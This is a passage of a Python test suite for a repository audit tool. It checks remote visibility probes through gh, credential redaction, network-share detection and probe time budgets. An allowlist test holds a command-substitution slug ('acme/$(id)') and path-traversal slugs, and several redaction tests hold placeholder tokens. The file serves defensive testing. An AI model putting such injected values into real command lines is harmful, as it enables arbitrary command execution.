                "gh api --hostname github.com repos/acme/widgets": (True, "private"),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])
        probes = [argv for argv in runner.calls if argv[:1] == ["gh"]]
        self.assertEqual(
            probes,
            [
                [
                    "gh",
                    "api",
                    "--hostname",
                    "github.com",
                    "repos/acme/widgets",
                    "--jq",
                    ".visibility",
                ]
            ],
        )

    def test_a_refused_rest_probe_falls_back_to_graphql(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        lanes = [argv[1] for argv in runner.calls if argv[:1] == ["gh"]]
        self.assertEqual(lanes, ["api", "repo"])
        # The evidence names the transport that actually answered.
        self.assertIn("`gh repo view github.com/acme/widgets", self.details(result))

    def test_a_rest_answer_that_is_not_a_verdict_falls_back_too(self) -> None:
        # `gh api --jq .visibility` prints a literal `null` at exit 0 when the
        # field is absent, and "NULL" is truthy: gating the fallback on
        # emptiness would rebuild the mute wall on the new lane.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh api": (True, "null"),
                "gh repo view": (True, "PRIVATE"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])
        self.assertEqual(
            [argv[1] for argv in runner.calls if argv[:1] == ["gh"]], ["api", "repo"]
        )

    def test_an_exhausted_quota_is_named_in_the_unproven_line(self) -> None:
        # Both lanes refusing used to print the same sentence as an absent
        # binary: "returned <no output>". The probe's own words name the cause.
        repo = self.make_repo(sensitive_data=True)

        class RefusingRunner(FakeCommandRunner):
            """A resolver that reports WHY it failed, as production does."""

            def __call__(self, argv, cwd=None, **kwargs):
                resolved, output = super().__call__(argv, cwd, **kwargs)
                if argv[:1] == ["gh"]:
                    return (
                        False,
                        "",
                        "gh: API rate limit exceeded for user ID 4210. (HTTP 403)",
                    )
                return resolved, output

        runner = RefusingRunner({"remote --verbose": (True, GITHUB_REMOTE_OUTPUT)})
        result = self.audit(repo, runner)
        detail = self.details(result)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("unmeasured", detail)
        self.assertIn("(quota exhausted)", detail)
        self.assertIn("API rate limit exceeded", detail)
        # Both transports are named, so the reader knows neither answered.
        self.assertIn("gh api --hostname github.com repos/acme/widgets", detail)
        self.assertIn("gh repo view github.com/acme/widgets", detail)
        self.assertTrue(result["ok"], result["issues"])

    def test_a_credential_in_probe_stderr_never_reaches_a_finding(self) -> None:
        # `gh` echoes tokens from a misconfigured credential helper and `git`
        # echoes whole remote URLs, and this text is now quoted into findings
        # that reach stdout, --json and the doctor detail.
        repo = self.make_repo(sensitive_data=True)

        class LeakingRunner(FakeCommandRunner):
            def __call__(self, argv, cwd=None, **kwargs):
                resolved, output = super().__call__(argv, cwd, **kwargs)
                if argv[:1] == ["gh"]:
                    return (
                        False,
                        "",
                        "error: ghp_0123456789abcdefghijABCDEF authenticating to "
                        "https://ci-user:s3cr3t-pat@github.com/acme/widgets.git",
                    )
                return resolved, output

        runner = LeakingRunner({"remote --verbose": (True, GITHUB_REMOTE_OUTPUT)})
        result = self.audit(repo, runner)
        rendered = self.details(result) + json.dumps(result)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertNotIn("ghp_0123456789abcdefghijABCDEF", rendered)
        self.assertNotIn("s3cr3t-pat", rendered)
        self.assertNotIn("ci-user", rendered)
        self.assertIn("***", rendered)

    def test_the_rest_route_accepts_only_an_owner_repo_pair(self) -> None:
        # The path is interpolated into argv, so it is an allowlist and every
        # rejection skips the REST lane rather than composing a command line.
        for slug, path in (
            ("acme/widgets", "acme/widgets"),
            ("github.com/acme/widgets", "acme/widgets"),
            ("https://github.com/acme/widgets", "acme/widgets"),
            ("acme/widgets.js", "acme/widgets.js"),
            ("_acme-2/-widgets_", "_acme-2/-widgets_"),
            ("../acme/widgets", ""),
            ("acme/../widgets", ""),
            ("acme/widgets/extra", ""),
            ("acme", ""),
            ("acme/wid gets", ""),
            ("acme/wid&gets", ""),
            ("acme/..", ""),
            ("acme/$(id)", ""),
        ):
            with self.subTest(slug=slug):
                self.assertEqual(harness.github_rest_repo_path(slug), path)

    def test_a_slug_the_rest_route_rejects_still_reaches_graphql(self) -> None:
        runner = FakeCommandRunner({"gh repo view": (True, "PRIVATE")})
        visibility, evidence = harness.github_visibility(
            "acme/wid gets", Path("."), runner, None
        )
        self.assertEqual(visibility, "PRIVATE")
        self.assertEqual([argv[1] for argv in runner.calls], ["repo"])
        self.assertIn("gh repo view", evidence)

    def test_a_failed_resolver_keeps_what_it_said(self) -> None:
        script = "import sys; sys.stderr.write('boom: denied\\n'); sys.exit(1)"
        resolved, output, failure = harness.bounded_command_result(
            [sys.executable, "-c", script]
        )
        self.assertFalse(resolved)
        self.assertEqual(output, "")
        self.assertIn("boom: denied", failure)
        # The two-element contract every other caller uses is unchanged.
        self.assertEqual(
            harness.bounded_command_output([sys.executable, "-c", script]), (False, "")
        )

    def test_an_absent_probe_binary_is_named_not_silent(self) -> None:
        # Since issue #112 an absent probe is diagnosed by the PATH resolver
        # rather than by the failed spawn, so the wording is the resolver's.
        # The contract this test guards is unchanged: never a silent empty
        # probe, and the name the caller asked for appears in the diagnosis.
        resolved, _output, failure = harness.bounded_command_result(
            ["definitely-not-a-real-binary-agent-harness"]
        )
        self.assertFalse(resolved)
        self.assertIn("definitely-not-a-real-binary-agent-harness", failure)
        self.assertIn(
            "no executable of that name on PATH",
            harness.probe_failure_note(
                ["definitely-not-a-real-binary-agent-harness"], failure
            ),
        )

    def test_a_public_origin_still_fails_the_audit(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://github.com/acme/widgets.git (fetch)\n"
                    "upstream\thttps://github.com/upstream/widgets.git (fetch)",
                ),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertIn("MISMATCH", self.statuses(result, "remote visibility"))
        self.assertFalse(result["ok"])

    def test_offline_audit_runs_no_network_resolver(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        output = io.StringIO()
        with redirect_stdout(output):
            code = harness.audit_command(
                SimpleNamespace(path=str(repo), json=False, offline=True)
            )
        text = output.getvalue()
        self.assertEqual(code, 0)
        # git still answers locally; `gh` is never consulted, and the
        # unmeasured visibility reports UNPROVEN rather than a pass.
        self.assertIn("[ok] harness audit", text)
        self.assertNotIn("[MISMATCH] sensitive_data", text)
        self.assertFalse(harness.local_only_command_output(["gh", "repo", "view"])[0])

    def test_declared_sensitive_data_on_private_remote_passes(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view": (True, "PRIVATE"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])
        self.assertTrue(result["ok"], result["issues"])

    def test_unresolvable_visibility_is_unproven_and_never_a_pass(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {"remote --verbose": (True, GITHUB_REMOTE_OUTPUT)}, default=(False, "")
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("unmeasured", self.details(result))
        # Offline is not a defect: it must not fail the audit either.
        self.assertTrue(result["ok"], result["issues"])

    def test_non_github_remote_is_unproven(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://gitlab.example/acme/widgets.git (fetch)",
                )
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertNotIn("gh repo view", " ".join(" ".join(c) for c in runner.calls))

    def test_a_unc_remote_is_unproven_not_a_local_only_pass(self) -> None:
        # `//server/share/repo.git` starts with `/`, so the local-path rule
        # called a network share local and printed `ok` without measuring who
        # can reach it.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\t//fileserver/git/secrets.git (fetch)\n"
                    "origin\t//fileserver/git/secrets.git (push)",
                )
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("is a network share", self.details(result))
        # Unprovable is not a repo defect, so it does not fail the audit.
        self.assertTrue(result["ok"], result["issues"])

    def test_an_ordinary_absolute_path_remote_is_still_local(self) -> None:
        for url in ("/srv/git/widgets.git", "./widgets.git", "~/git/widgets.git"):
            with self.subTest(url=url):
                repo = self.make_repo(sensitive_data=True)
                runner = FakeCommandRunner(
                    {"remote --verbose": (True, f"origin\t{url} (fetch)")}
                )
                result = self.audit(repo, runner)
                self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])

    def test_publishing_endpoints_are_probed_before_advisory_ones(self) -> None:
        # The probe budget is shared. With git's alphabetical remote order, a
        # few slow advisory remotes ahead of `origin` could exhaust it and
        # leave the one exposure this check exists to catch as UNPROVEN.
        entries = harness.publishing_remote_endpoints(
            [
                ("aaa-mirror", "https://github.com/acme/mirror.git", "fetch"),
                ("aaa-mirror", "https://github.com/acme/mirror.git", "push"),
                ("origin", "https://github.com/acme/widgets.git", "fetch"),
                ("origin", "https://github.com/acme/widgets.git", "push"),
                ("zzz-upstream", "https://github.com/upstream/widgets.git", "fetch"),
            ]
        )
        self.assertTrue(entries[0][2], entries)
        self.assertEqual(entries[0][0], "origin")
        self.assertEqual(
            [name for name, _url, publishes, _note in entries if publishes], ["origin"]
        )

    def test_a_public_origin_survives_a_budget_spent_on_advisory_remotes(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        clock = {"now": 0.0}

        class SlowRunner(FakeCommandRunner):
            """Every visibility probe burns 3s of the 8s aggregate budget."""

            def __call__(self, argv, cwd=None, **kwargs):
                answer = super().__call__(argv, cwd, **kwargs)
                if argv[:1] == ["gh"]:
                    clock["now"] += 3.0
                return answer

        runner = SlowRunner(
            {
                "remote --verbose": (
                    True,
                    "aaa\thttps://github.com/acme/a.git (fetch)\n"
                    "aaa\thttps://github.com/acme/a.git (push)\n"
                    "bbb\thttps://github.com/acme/b.git (fetch)\n"
                    "bbb\thttps://github.com/acme/b.git (push)\n"
                    "ccc\thttps://github.com/acme/c.git (fetch)\n"
                    "ccc\thttps://github.com/acme/c.git (push)\n"
                    "origin\thttps://github.com/acme/widgets.git (fetch)\n"
                    "origin\thttps://github.com/acme/widgets.git (push)",
                ),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
                "gh repo view": (True, "PRIVATE"),
            }
        )
        with mock.patch.object(harness, "monotonic", side_effect=lambda: clock["now"]):
            result = self.audit(repo, runner, deadline=8.0)
        self.assertIn("MISMATCH", self.statuses(result, "remote visibility"))
        self.assertFalse(result["ok"])

    def test_a_public_fetch_url_behind_a_private_pushurl_is_not_a_mismatch(
        self,
    ) -> None:
        # `git remote -v` prints fetch and push endpoints on separate rows.
        # Discarding the direction made a public FETCH mirror look like the
        # place work is published and hard-failed the audit.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://github.com/acme/widgets.git (fetch)\n"
                    "origin\thttps://github.com/acme/widgets-private.git (push)",
                ),
                "gh repo view github.com/acme/widgets-private": (True, "PRIVATE"),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            sorted(self.statuses(result, "remote visibility")), ["advisory", "ok"]
        )
        self.assertTrue(result["ok"], result["issues"])
        self.assertIn("only FETCHES from this URL", self.details(result))

    def test_a_public_pushurl_behind_a_private_fetch_url_still_fails(self) -> None:
        # The mirror image: what is pushed to is what is published.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://github.com/acme/widgets-private.git (fetch)\n"
                    "origin\thttps://github.com/acme/widgets.git (push)",
                ),
                "gh repo view github.com/acme/widgets-private": (True, "PRIVATE"),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertIn("MISMATCH", self.statuses(result, "remote visibility"))
        self.assertFalse(result["ok"])

    def test_a_public_sole_remote_without_origin_fails_the_audit(self) -> None:
        # The origin-only rule presumed a private `origin` exists. With no
        # origin at all, the remote that carries the work IS the publishing
        # remote; calling it "not the publishing remote" turned a real exposure
        # into an exit-0 advisory.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "github\thttps://github.com/acme/secrets.git (fetch)\n"
                    "github\thttps://github.com/acme/secrets.git (push)",
                ),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        self.assertFalse(result["ok"])
        detail = self.details(result)
        self.assertIn("no remote named 'origin' is configured", detail)
        self.assertNotIn("is not the publishing remote", detail)

    def test_github_slugs_survive_every_supported_remote_spelling(self) -> None:
        # A captured port became the owner, so `gh` was asked about `22/owner`
        # and a public origin degraded to UNPROVEN instead of a mismatch.
        for remote, slug in (
            ("ssh://git@github.com:22/acme/widgets.git", "acme/widgets"),
            ("ssh://git@github.com:2222/acme/widgets", "acme/widgets"),
            ("ssh://github.com/acme/widgets.git", "acme/widgets"),
            ("ssh://git@github.com:acme/widgets.git", "acme/widgets"),
            ("https://github.com/acme/widgets.git", "acme/widgets"),
            ("https://token@github.com/acme/widgets.git", "acme/widgets"),
            ("git@github.com:acme/widgets.git", "acme/widgets"),
            ("https://gitlab.example/acme/widgets.git", ""),
        ):
            with self.subTest(remote=remote):
                self.assertEqual(harness.github_repo_slug(remote), slug)

    def test_a_ported_ssh_origin_is_probed_by_its_real_slug(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\tssh://git@github.com:22/acme/widgets.git (fetch)\n"
                    "origin\tssh://git@github.com:22/acme/widgets.git (push)",
                ),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        self.assertIn(
            ["gh", "repo", "view", "github.com/acme/widgets", "--json", "visibility"],
            [argv[:6] for argv in runner.calls],
        )

    def test_undecodable_resolver_output_never_aborts_the_audit(self) -> None:
        # Under a UTF-8 locale, `subprocess.run(text=True)` raises
        # UnicodeDecodeError while building its result (and leaves stdout None
        # on the Windows reader-thread path). `main()` catches only
        # HarnessError, so the audit died with a traceback where the contract
        # says the check is UNPROVEN. Decoding is explicit and tolerant now.
        script = "import sys; sys.stdout.buffer.write(b'origin\\thttps://h/\\xff/r')"
        resolved, output = harness.bounded_command_output(
            [sys.executable, "-c", script]
        )
        self.assertTrue(resolved)
        self.assertIn("origin", output)
        self.assertIn("�", output)

    def test_a_timed_out_resolver_returns_within_its_bound(self) -> None:
        # A resolver whose DESCENDANT inherits the captured pipes (ssh behind
        # `git ls-remote`) kept the drain waiting long past the deadline the
        # aggregate budget is built on, because `subprocess.run` kills only the
        # process it started. The child now runs in its own group and the whole
        # tree is killed, and the pipes are closed rather than drained again.
        script = (
            "import subprocess, sys, time;"
            "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'],"
            " stdout=sys.stdout, stderr=sys.stderr);"
            "time.sleep(60)"
        )
        started = time.monotonic()
        resolved, output = harness.bounded_command_output(
            [sys.executable, "-c", script], timeout=1.0
        )
        elapsed = time.monotonic() - started
        self.assertFalse(resolved)
        self.assertEqual(output, "")
        # Generous, but far below the 60s the grandchild would otherwise hold.
        self.assertLess(elapsed, 20.0, f"bounded_command_output took {elapsed:.1f}s")

    def test_embedded_credentials_never_reach_a_finding(self) -> None:
        # `git remote --verbose` keeps URL userinfo, so an audit that echoes
        # the raw URL leaks a PAT into the terminal, --json and CI logs.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://ci-user:s3cr3t-pat@gitlab.example/acme/repo.git"
                    " (fetch)\n"
                    "mirror\thttps://token@github.com/acme/widgets.git (fetch)",
                ),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        rendered = self.details(result) + json.dumps(result)
        self.assertNotIn("s3cr3t-pat", rendered)
        self.assertNotIn("ci-user", rendered)
        self.assertNotIn("token@", rendered)
        self.assertIn("https://***@gitlab.example/acme/repo.git", rendered)
        self.assertIn("https://***@github.com/acme/widgets.git", rendered)

    def test_a_credential_in_the_query_string_is_redacted_too(self) -> None:
        # Userinfo is not the only place a token rides: several hosts accept
        # `?private_token=`/`?access_token=`, and the whole tail is dropped
        # rather than matched against known parameter names, which would fail
        # open on the next host's spelling.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://gitlab.example/acme/repo.git"
                    "?private_token=s3cr3t-pat (fetch)",
                )
            }
        )
        result = self.audit(repo, runner)
        rendered = self.details(result) + json.dumps(result)
        self.assertNotIn("s3cr3t-pat", rendered)
        self.assertNotIn("private_token=", rendered)
        self.assertIn("https://gitlab.example/acme/repo.git?<redacted>", rendered)
        self.assertEqual(
            harness.redact_remote_url("https://h/a/b.git#frag=PAT"),
            "https://h/a/b.git#<redacted>",
        )
        # A URL with no query keeps its exact spelling.
        self.assertEqual(
            harness.redact_remote_url("https://github.com/acme/widgets.git"),
            "https://github.com/acme/widgets.git",
        )

    def test_a_file_url_wrapping_a_unc_path_is_not_local(self) -> None:
        # `file:////server/share/repo.git` is the file-URL spelling of a UNC
        # path; matching `file://` first called a network share local.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\tfile:////fileserver/git/secrets.git (fetch)",
                )
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("is a network share", self.details(result))
        # A file URL naming a genuinely local path is still local.
        for url in ("file:///srv/git/widgets.git", "file://localhost/srv/git/w.git"):
            with self.subTest(url=url):
                local_repo = self.make_repo(sensitive_data=True)
                local_runner = FakeCommandRunner(
                    {"remote --verbose": (True, f"origin\t{url} (fetch)")}
                )
                local_result = self.audit(local_repo, local_runner)
                self.assertEqual(
                    self.statuses(local_result, "remote visibility"), ["ok"]
                )

    def test_a_file_url_authority_is_a_network_share(self) -> None:
        # `file://server/share/x` puts the host in the AUTHORITY, where the
        # earlier fix's fixed-prefix strip could not see it: the remainder had
        # no `//`, so the UNC rule missed it and `file://` claimed it as local.
        for url in (
            "file://fileserver/share/repo.git",
            "file:////fileserver/share/repo.git",
            "//fileserver/share/repo.git",
        ):
            with self.subTest(url=url):
                self.assertTrue(harness.remote_names_a_network_share(url), url)
        for url in (
            "file:///srv/git/widgets.git",
            "file://localhost/srv/git/widgets.git",
            "/srv/git/widgets.git",
            "C:/git/widgets.git",
        ):
            with self.subTest(url=url):
                self.assertFalse(harness.remote_names_a_network_share(url), url)
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\tfile://fileserver/share/secrets.git (fetch)",
                )
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("is a network share", self.details(result))

    def test_a_configured_push_remote_beats_origin(self) -> None:
        # `branch.<name>.pushRemote` and `remote.pushDefault` decide where an
        # ordinary `git push` publishes. A private origin plus a public
        # pushDefault is a real exposure that the origin-only rule downgraded
        # to an exit-0 advisory.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://github.com/acme/widgets-private.git (fetch)\n"
                    "origin\thttps://github.com/acme/widgets-private.git (push)\n"
                    "mirror\thttps://github.com/acme/widgets.git (fetch)\n"
                    "mirror\thttps://github.com/acme/widgets.git (push)",
                ),
                "config --get remote.pushDefault": (True, "mirror"),
                "gh repo view github.com/acme/widgets-private": (True, "PRIVATE"),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertIn("MISMATCH", self.statuses(result, "remote visibility"))
        self.assertFalse(result["ok"])
        self.assertIn("git is configured to push to mirror", self.details(result))

    def test_a_branch_push_remote_beats_push_default(self) -> None:
        self.assertEqual(
            harness.configured_push_remote(
                Path("."),
                FakeCommandRunner(
                    {
                        "rev-parse --abbrev-ref HEAD": (True, "work"),
                        "config --get branch.work.pushRemote": (True, "fork"),
                        "config --get remote.pushDefault": (True, "mirror"),
                    }
                ),
                None,
            ),
            ("fork", True),
        )
        # Nothing configured, or a silent git, still means `origin` — and that
        # is a MEASURED answer, because `git config --get` exits non-zero for
        # an unset key.
        self.assertEqual(
            harness.configured_push_remote(Path("."), FakeCommandRunner(), None),
            ("origin", True),
        )

    def test_an_unmeasured_push_remote_is_unproven_not_origin(self) -> None:
        # An exhausted budget cannot tell "unset" from "never ran", and
        # guessing `origin` would downgrade a public push endpoint under
        # `remote.pushDefault` to an exit-0 advisory.
        runner = FakeCommandRunner()
        self.assertEqual(
            harness.configured_push_remote(Path("."), runner, harness.monotonic() - 1),
            ("origin", False),
        )
        self.assertEqual(runner.calls, [])
        repo = self.make_repo(sensitive_data=True)

        class BudgetBurningRunner(FakeCommandRunner):
            """`git remote --verbose` answers, then the budget is gone."""

            def __call__(self, argv, cwd=None, **kwargs):
                answer = super().__call__(argv, cwd, **kwargs)
                clock["now"] += 9.0
                return answer

        clock = {"now": 0.0}
        burning = BudgetBurningRunner(
            {"remote --verbose": (True, GITHUB_REMOTE_OUTPUT)}
        )
        with mock.patch.object(harness, "monotonic", side_effect=lambda: clock["now"]):
            result = self.audit(repo, burning, deadline=8.0)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertIn("push-remote configuration", self.details(result))
        self.assertTrue(result["ok"], result["issues"])

    def test_a_dot_push_remote_publishes_to_no_remote(self) -> None:
        # `remote.pushDefault = .` targets THIS repository. Passing the literal
        # `.` through matched no remote and then tripped the "no publishing
        # remote configured, treat them all as publishing" rule — a hard
        # MISMATCH for a public origin an ordinary push never reaches.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "config --get remote.pushDefault": (True, "."),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["advisory"])
        self.assertIn("pushes to the local repository", self.details(result))
        self.assertTrue(result["ok"], result["issues"])

    def test_the_visibility_probe_is_pinned_to_github_dot_com(self) -> None:
        # `gh repo view OWNER/REPO` resolves against GH_HOST or the default
        # authenticated host, so on a machine pointed at GitHub Enterprise the
        # probe could answer PRIVATE about a different repository with the same
        # slug while the github.com remote is public.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view github.com/acme/widgets": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        probes = [argv for argv in runner.calls if argv[:1] == ["gh"]]
        self.assertTrue(probes)
        # Both transports pin the host, each in its own spelling.
        for argv in probes:
            with self.subTest(argv=argv):
                if argv[1] == "api":
                    self.assertEqual(argv[2:4], ["--hostname", "github.com"])
                else:
                    self.assertTrue(argv[3].startswith("github.com/"), argv)

    def test_redaction_keeps_scp_syntax_actionable(self) -> None:
        # `git@github.com:owner/repo` carries a fixed account name, not a
        # secret; blanking it would only make the finding harder to act on.
        self.assertEqual(
            harness.redact_remote_url("git@github.com:acme/widgets.git"),
            "git@github.com:acme/widgets.git",
        )
        self.assertEqual(
            harness.redact_remote_url("https://github.com/acme/widgets.git"),
            "https://github.com/acme/widgets.git",
        )
        self.assertEqual(
            harness.redact_remote_url("ssh://git:pw@github.com/acme/widgets.git"),
            "ssh://***@github.com/acme/widgets.git",
        )

    def test_local_only_remote_is_a_pass(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {"remote --verbose": (True, f"origin\t{self.root} (fetch)")}
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])

    def test_remote_enumeration_failure_is_unproven(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(default=(False, ""))
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertTrue(result["ok"])

    def test_absent_remote_is_a_pass_not_an_unproven(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner({"remote --verbose": (True, "")})
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["ok"])
        self.assertIn("nothing is published", self.details(result))

    def test_exhausted_deadline_spawns_nothing_and_reports_unproven(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner({"remote --verbose": (True, GITHUB_REMOTE_OUTPUT)})
        result = self.audit(repo, runner, deadline=harness.monotonic() - 1)
        self.assertEqual(runner.calls, [])
        self.assertEqual(self.statuses(result, "remote visibility"), ["UNPROVEN"])
        self.assertTrue(result["ok"])

    def test_a_measured_answer_survives_the_budget_expiring(self) -> None:
        """The clock is read once per command, before it starts.

        Discarding an answer that already proved a remote PUBLIC would turn
        the one finding this check exists to make into an UNPROVEN.
        """
        repo = self.make_repo(sensitive_data=True)
        clock = {"now": 0.0}

        class OverrunningRunner(FakeCommandRunner):
            """The visibility probe itself consumes the rest of the budget.

            The burn is charged to the GraphQL lane because that is the one
            that ANSWERS here: REST is probed first and this fixture has no
            reply for it, so charging every `gh` call would exhaust the budget
            before the measurement under test ever ran.
            """

            def __call__(self, argv, cwd=None, **kwargs):
                answer = super().__call__(argv, cwd, **kwargs)
                if argv[:2] == ["gh", "repo"]:
                    clock["now"] += 10.0
                return answer

        runner = OverrunningRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        with mock.patch.object(harness, "monotonic", side_effect=lambda: clock["now"]):
            result = self.audit(repo, runner, deadline=8.0)
        # The budget really expired mid-probe, and the answer still counted.
        self.assertGreater(clock["now"], 8.0)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])

    def test_repo_without_the_overlay_never_touches_the_network(self) -> None:
        repo = self.make_repo(sensitive_data=False)
        runner = FakeCommandRunner()
        result = self.audit(repo, runner)
        self.assertEqual(runner.calls, [])
        self.assertEqual(self.statuses(result, "remote visibility"), [])

    def test_privacy_claims_match_the_phrasings_docs_actually_use(self) -> None:
        claiming = (
            "This private repository versions the user's config.",
            "This repository is private.",
            "We keep private repos for client work.",
            "It lives in a private GitHub repository.",
            "The repo is private and must stay that way.",
            "Everything in this repository is kept private.",
            "Keep the repo private.",
            "These repos remain private.",
            "Pushes go to a private remote.",
        )
        for text in claiming:
            with self.subTest(text=text):
                self.assertIsNotNone(harness.PRIVACY_CLAIM_PATTERN.search(text))
        not_claiming = (
            "Never commit a private key.",
            "Privately held opinions are out of scope.",
            "The repository is public.",
            # Ordinary secrets-hygiene boilerplate: a claim about keys and
            # secrets, not about this repository's visibility.
            "Keep private keys out of version control.",
            "Secrets remain private to the operator.",
            "Private tokens stay private; rotate them quarterly.",
            "Credentials are kept private in the vault.",
        )
        for text in not_claiming:
            with self.subTest(text=text):
                self.assertIsNone(harness.PRIVACY_CLAIM_PATTERN.search(text))

    def test_a_natural_privacy_claim_raises_the_advisory(self) -> None:
        repo = self.make_repo(
            sensitive_data=False,
            agents_text="This repository is private; do not publish it.\n",
        )
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "documented privacy"), ["advisory"])

    def test_documented_privacy_without_the_overlay_is_an_advisory_split(self) -> None:
        repo = self.make_repo(
            sensitive_data=False,
            agents_text="This private repository versions the user's config.\n",
        )
        runner = FakeCommandRunner()
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "documented privacy"), ["advisory"])
        self.assertTrue(result["ok"], result["issues"])

    # --- human_todo versus a file that exists ---------------------------------

    def test_human_todo_naming_a_missing_file_is_a_mismatch(self) -> None:
        repo = self.make_repo(human_todo="HUMAN_TODO.md")
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["MISMATCH"])
        self.assertFalse(result["ok"])

    def test_human_todo_pointing_at_a_real_file_passes(self) -> None:
        repo = self.make_repo(human_todo="HUMAN_TODO.md")
        (repo / "HUMAN_TODO.md").write_text("- [ ] item\n", encoding="utf-8")
        result = self.audit(repo, FakeCommandRunner())
        self.assertEqual(self.statuses(result, "human_todo"), ["ok"])
        self.assertTrue(result["ok"], result["issues"])

    def test_human_todo_escaping_the_repo_is_a_mismatch(self) -> None:
        repo = self.make_repo(human_todo="../HUMAN_TODO.md")
        result = self.audit(repo, FakeCommandRunner())
